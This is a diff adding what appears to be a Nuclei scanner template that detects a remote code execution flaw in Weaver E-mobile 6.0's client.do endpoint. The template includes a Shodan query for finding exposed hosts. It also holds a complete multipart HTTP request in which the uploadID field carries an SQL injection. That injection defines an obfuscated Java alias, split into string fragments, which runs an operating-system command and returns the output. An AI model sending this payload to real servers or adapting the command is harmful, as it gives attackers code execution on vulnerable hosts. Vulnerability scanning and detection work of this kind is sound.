@@ -1,0 +1,54 @@
+id: weaver-e-mobile-rce
+
+info:
+  name: Weaver E-mobile client.do - Remote Code Execution
+  author: SleepingBag945
+  severity: critical
+  description: |
+    E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the command execution function of the underlying operating system. An attacker can insert special characters or Command sequence to trick the application into executing it as a valid command, thus gaining command execution permissions from the server.
+  reference:
+    - https://mp.weixin.qq.com/s/z-WN2_MTxdk3z4LvchXkXw
+    - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E6%B3%9B%E5%BE%AE%20E-Mobile%206.0%20%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"E-Mobile&nbsp"
+  tags: e-mobile,rce,weaver,intrusive
+
+http:
+  - raw:
+      - |
+        POST /client.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
+
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="method"
+
+        getupload
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="uploadID"
+
+        1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('ipconfig');--
+        ------WebKitFormBoundary{{randstr}}--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'Windows IP Configuration')
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/html"
+        negative: true
+        condition: and
+# digest: 490a00463044022025c8472f443dee552bceb620c8c96ba050f3ca13e2092dae59d945f5bfcc9d21022076285d4a55cb1c94a2ea1cc5772ef95cb344bb9bcbb8e2b5f42cda15ec4ea2ec:922c64590222798bb761d5b6d8e72950
